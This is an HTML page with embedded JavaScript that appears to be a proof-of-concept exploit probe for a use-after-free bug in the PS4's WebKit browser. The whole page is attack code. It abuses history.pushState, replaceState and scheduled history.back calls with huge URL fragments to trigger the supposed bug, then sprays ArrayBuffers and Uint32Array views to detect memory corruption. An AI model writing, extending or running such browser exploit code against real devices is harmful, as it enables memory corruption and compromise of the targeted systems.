<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – TypedArray UAF Overlay</title>

</head>

<body>
<h2>PS4 WebKit – TypedArray Overlay Probe</h2>

<button onclick="run()">RUN OVERLAY TEST</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const ITER = 48;
const STEP = 14461;

async function run(){
    logEl.textContent = "";
    log("=== START OVERLAY PROBE ===");

    let size = 977;

    for(let i=0;i<ITER;i++){
        const frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] history.back scheduled`);
        }

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW (stable) <<<");
    await sleep(100);

    // ------------------------------------------------
    // TARGETED TYPED ARRAY SPRAY
    // ------------------------------------------------
    log("[SPRAY] Allocating ArrayBuffers (fragment-sized)");
    let buffers = [];
    for(let i=0;i<512;i++){
        buffers.push(new ArrayBuffer(1024));
    }

    log("[SPRAY] Creating Uint32Array overlays");
    let views = [];
    for(let i=0;i<buffers.length;i++){
        let v = new Uint32Array(buffers[i]);
        v[0] = 0x41414141;
        v[1] = 0x42424242;
        views.push(v);
    }

    log("[CHECK] Scanning for corruption");
    let anomalies = 0;
    for(let i=0;i<views.length;i++){
        if(views[i][0] !== 0x41414141){
            anomalies++;
            log(`[!] Anomaly at view ${i}: ${views[i][0].toString(16)}`);
        }
    }

    log(`Anomalies detected: ${anomalies}`);
    log("=== END OVERLAY PROBE ===");
}
</script>
</body>
</html>

